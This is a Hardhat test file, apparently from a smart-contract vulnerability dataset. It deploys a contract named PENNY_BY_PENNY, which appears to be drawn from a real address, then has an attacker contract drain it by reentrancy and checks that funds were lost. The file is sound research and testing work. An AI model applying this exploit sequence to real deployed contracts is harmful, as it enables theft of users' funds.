const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol", function () {  
    let PENNY_BY_PENNY;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        const logPath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol/LogFile.json');
        const logJson = JSON.parse(fs.readFileSync(logPath));
        Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy PENNY_BY_PENNY contract with Log address
        const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol/PENNY_BY_PENNY.json');
        const json = JSON.parse(fs.readFileSync(codePath));
        PENNY_BY_PENNY = await ethers.getContractFactory(json.abi, json.bytecode);
        victim = await PENNY_BY_PENNY.deploy();
        await victim.waitForDeployment();
        await victim.SetLogFile(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with PENNY_BY_PENNY address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it('sanity check: reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol', async function () {
        await expect(victim.Put(0, { value: ethers.parseEther('10') })).to.not.be.reverted;
        expect(await ethers.provider.getBalance(victim.target)).to.equal(ethers.parseEther("10"));
        await expect(victim.Collect(ethers.parseEther('10'))).to.not.be.reverted;
        expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
      });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Put( 0, {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from maliciousContract on victim contract
        await hacker.deposit(0,{value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack(ethers.parseEther("2"));
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has a drained account
        expect(victimBalance).to.be.below(ethers.parseEther("5")); 

        // 5 original balance + 2 from  initial deposit 
        expect(maliciousContractBalance).to.be.above(ethers.parseEther("2"));
        
    });
    });
  